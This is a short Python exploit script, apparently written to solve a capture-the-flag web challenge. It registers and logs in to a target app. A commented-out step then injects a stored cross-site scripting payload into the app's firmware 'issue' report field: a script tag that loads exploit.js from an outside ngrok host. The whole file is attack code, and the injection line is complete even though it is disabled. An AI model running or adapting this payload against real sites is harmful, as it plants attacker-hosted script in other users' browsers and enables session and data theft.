#!/usr/bin/python3

import requests
import sys
from pprint import pprint


def explotation(url: str):
    
    sess = requests.Session()

    ress_auth = sess.post(url=url+"api/register", json=
        {"username":"honey", "password":"honey"}
    )
    login = sess.post(url=url+"login", 
            data={"username":"honey", "password":"honey"})
    headers = login.headers

    print(headers)
    """honeyload = "<script src='https://1ed2-157-100-198-203.ngrok.io/exploit.js'></script>"
    report = sess.post(url=url + "api/firmware/report", data='{"module_id":"1","issue":"' + honeyload + '"}', headers=headers)
    
    pprint(report.text)"""


def main():
    try:
        main_url = sys.argv[1]
        explotation(main_url)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        print("Exiting \n\n")
        exit(0)



if __name__ == "__main__":
    main()
